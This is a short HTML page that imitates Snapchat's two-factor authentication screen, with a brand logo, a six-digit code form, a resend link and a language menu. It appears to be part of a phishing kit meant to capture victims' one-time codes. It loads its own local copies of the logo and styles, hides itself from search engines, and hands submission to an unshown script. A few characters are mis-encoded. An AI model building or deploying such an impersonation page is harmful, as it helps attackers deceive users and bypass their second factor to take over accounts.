<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Two-Factor Authentication</title>
    <link rel="icon" type="image/png" href="Snapchat.png">
    <link rel="stylesheet" href="Snapchat.css">
    <meta name="description" content="Verify your Snapchat account">
    <meta name="robots" content="noindex, nofollow">
</head>
<body>
    <div class="container">
        <div class="language-container">
            <button class="language-btn" onclick="toggleLanguageMenu()" aria-label="Change language">üåê</button>
            <div class="language-menu" id="language-menu">
                <a href="#" onclick="setLanguage('en'); return false;">English</a>
                <a href="#" onclick="setLanguage('fr'); return false;">Fran√ßais</a>
            </div>
        </div>
        <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
        <h1 id="title">Two-Factor Authentication</h1>
        <p id="subtitle">Enter the 6-digit code we sent you</p>
        <form id="codeForm" autocomplete="off">
            <div class="code-input">
                <input type="tel" name="digit1" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 1">
                <input type="tel" name="digit2" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 2">
                <input type="tel" name="digit3" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 3">
                <input type="tel" name="digit4" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 4">
                <input type="tel" name="digit5" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 5">
                <input type="tel" name="digit6" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 6">
            </div>
            <button type="submit" class="verify-btn" id="continue-btn">Continue</button>
        </form>
        <a href="#" class="resend-link" id="resend-link" onclick="return resendCode();">Didn't receive a code?</a>
        <p id="message"></p>
        <p class="support-text" id="support-text">Having trouble? Visit our Help Center</p>
    </div>
    <script src="script.js"></script>
</body>
</html>
